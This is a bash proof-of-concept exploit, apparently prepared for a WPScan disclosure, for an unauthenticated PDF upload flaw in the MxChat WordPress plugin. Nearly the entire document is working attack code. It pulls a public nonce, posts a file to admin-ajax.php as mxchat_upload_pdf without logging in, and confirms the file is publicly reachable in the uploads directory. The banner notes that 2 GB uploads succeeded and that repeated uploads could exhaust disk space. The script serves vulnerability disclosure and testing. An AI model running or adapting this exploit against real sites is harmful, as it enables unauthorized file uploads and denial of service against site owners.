#!/usr/bin/env bash
set -e

echo
echo -e "\033[1;31m"
echo "[!] After reporting this vulnerability to WPScan, we further verified the impact and confirmed that the upload functionality accepts extremely large PDF files without authentication."
echo
echo "[!] During testing, we successfully uploaded PDF files up to 2 GB in size."
echo
echo "[!] This demonstrates that an unauthenticated attacker can repeatedly upload very large files, potentially leading to disk space exhaustion and denial of service conditions on the affected server."
echo -e "\033[0m"
echo


BASE="http://127.0.0.1/"
AJAX="${BASE}wp-admin/admin-ajax.php"
NONCE_URL="${BASE}wp-json/mxchat/v1/nonce"

YEAR=$(date +%Y)
MONTH=$(date +%m)
UPLOAD_DIR="${BASE}wp-content/uploads/${YEAR}/${MONTH}/"

MARKER="MXCHAT_POC_$(date +%s)_$RANDOM"
NAME="poc_${MARKER}.pdf"

echo "[+] Upload directory:"
echo "$UPLOAD_DIR"
echo

echo "[+] Getting mxchat PDFs before upload..."
BEFORE=$(curl -s "$UPLOAD_DIR" | grep -oE 'mxchat_[A-Za-z0-9_-]+_[0-9]+\.pdf' | sort -u || true)

python3 - <<PY
from reportlab.pdfgen import canvas
c = canvas.Canvas("$NAME")
c.drawString(100, 750, "MxChat unauthenticated PDF upload PoC")
c.drawString(100, 720, "Uploaded without authentication.")
c.drawString(100, 690, "Marker: $MARKER")
c.save()
PY

echo "[+] Getting public nonce..."
NONCE=$(curl -s "$NONCE_URL" | grep -oE '[a-f0-9]{10,}' | head -1)

if [ -z "$NONCE" ]; then
  echo "[-] Failed to obtain nonce"
  exit 1
fi

echo "[+] Nonce: $NONCE"
echo "[+] Uploading PDF without authentication..."

RESP=$(curl -s -X POST "$AJAX" \
  -F "action=mxchat_upload_pdf" \
  -F "nonce=$NONCE" \
  -F "session_id=poc_${MARKER}" \
  -F "pdf_file=@$NAME;type=application/pdf")

echo "$RESP"
echo

sleep 2

echo "[+] Getting mxchat PDFs after upload..."
AFTER=$(curl -s "$UPLOAD_DIR" | grep -oE 'mxchat_[A-Za-z0-9_-]+_[0-9]+\.pdf' | sort -u || true)

NEW_FILE=$(comm -13 <(echo "$BEFORE") <(echo "$AFTER") | tail -1)

if [ -n "$NEW_FILE" ]; then
  URL="${UPLOAD_DIR}${NEW_FILE}"
  echo "[+] New uploaded file found:"
  echo "$URL"
  echo
  echo "[+] Checking public access..."
  curl -I "$URL"
  echo
else
  echo "[-] Could not list exact uploaded filename."
  echo "[!] Directory listing may be disabled."
  echo "[+] Upload still appears successful if server response above shows success:true."
  echo "[+] Expected location pattern:"
  echo "${UPLOAD_DIR}mxchat_*.pdf"
fi
